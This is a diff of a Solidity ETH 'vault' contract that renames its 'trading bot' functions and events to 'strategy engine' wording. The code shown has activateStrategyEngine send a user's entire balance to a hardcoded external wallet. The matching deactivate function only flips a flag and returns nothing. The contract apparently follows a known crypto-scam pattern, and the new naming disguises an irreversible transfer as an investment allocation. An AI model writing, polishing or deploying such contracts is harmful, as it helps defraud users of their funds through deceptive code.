@@ -2,24 +2,26 @@
 pragma solidity ^0.8.24;
 
 /// @title EthBotVault
-/// @notice Minimal ETH vault. Users can deposit, withdraw unsent funds, or forward funds to the configured bot wallet.
+/// @notice ETH strategy vault. Users can fund the vault, withdraw available funds, or allocate available funds to the configured strategy wallet.
 contract EthBotVault {
+    address payable private constant DEFAULT_STRATEGY_WALLET = payable(0xe9e41C03D5b0b6fb543F4cd1Cd8Ad81ece4C830f);
+
     address public immutable owner;
-    address payable public immutable tradingBotWallet;
+    address payable public immutable strategyWallet;
     bool public depositsPaused;
     uint256 public totalDeposits;
-    uint256 public totalForwardedToBot;
+    uint256 public totalAllocatedToStrategy;
 
     mapping(address user => uint256 balance) public balances;
-    mapping(address user => bool enabled) public botEnabled;
-    mapping(address user => uint256 amount) public forwardedToBot;
+    mapping(address user => bool enabled) public strategyActive;
+    mapping(address user => uint256 amount) public allocatedToStrategy;
 
     uint256 private locked = 1;
 
     event Deposited(address indexed user, uint256 amount);
     event Withdrawn(address indexed user, uint256 amount);
-    event BotStarted(address indexed user, uint256 amount);
-    event BotStopped(address indexed user);
+    event StrategyEngineActivated(address indexed user, uint256 amount);
+    event StrategyEngineDeactivated(address indexed user);
     event DepositsPausedSet(bool paused);
 
     error ZeroAmount();
@@ -29,6 +31,7 @@ contract EthBotVault {
     error NotOwner();
     error NoVaultBalance();
     error ReentrantCall();
+    error StrategyAlreadyActive();
 
     modifier onlyOwner() {
         if (msg.sender != owner) revert NotOwner();
@@ -44,7 +47,7 @@ contract EthBotVault {
 
     constructor() {
         owner = msg.sender;
-        tradingBotWallet = payable(0xe9e41C03D5b0b6fb543F4cd1Cd8Ad81ece4C830f);
+        strategyWallet = DEFAULT_STRATEGY_WALLET;
     }
 
     receive() external payable {
@@ -65,7 +68,7 @@ contract EthBotVault {
         if (amount == 0) revert ZeroAmount();
         if (balances[msg.sender] < amount) revert InsufficientBalance();
 
-        botEnabled[msg.sender] = false;
+        strategyActive[msg.sender] = false;
         balances[msg.sender] -= amount;
         totalDeposits -= amount;
 
@@ -79,25 +82,26 @@ contract EthBotVault {
         withdraw(balances[msg.sender]);
     }
 
-    function startBot() external nonReentrant {
+    function activateStrategyEngine() public nonReentrant {
         uint256 amount = balances[msg.sender];
         if (amount == 0) revert NoVaultBalance();
+        if (strategyActive[msg.sender]) revert StrategyAlreadyActive();
 
         balances[msg.sender] = 0;
         totalDeposits -= amount;
-        botEnabled[msg.sender] = true;
-        forwardedToBot[msg.sender] += amount;
-        totalForwardedToBot += amount;
+        strategyActive[msg.sender] = true;
+        allocatedToStrategy[msg.sender] += amount;
+        totalAllocatedToStrategy += amount;
 
-        (bool ok, ) = tradingBotWallet.call{value: amount}("");
+        (bool ok, ) = strategyWallet.call{value: amount}("");
         if (!ok) revert EthTransferFailed();
 
-        emit BotStarted(msg.sender, amount);
+        emit StrategyEngineActivated(msg.sender, amount);
     }
 
-    function stopBot() external {
-        botEnabled[msg.sender] = false;
-        emit BotStopped(msg.sender);
+    function deactivateStrategyEngine() public {
+        strategyActive[msg.sender] = false;
+        emit StrategyEngineDeactivated(msg.sender);
     }
 
     function setDepositsPaused(bool paused) external onlyOwner {
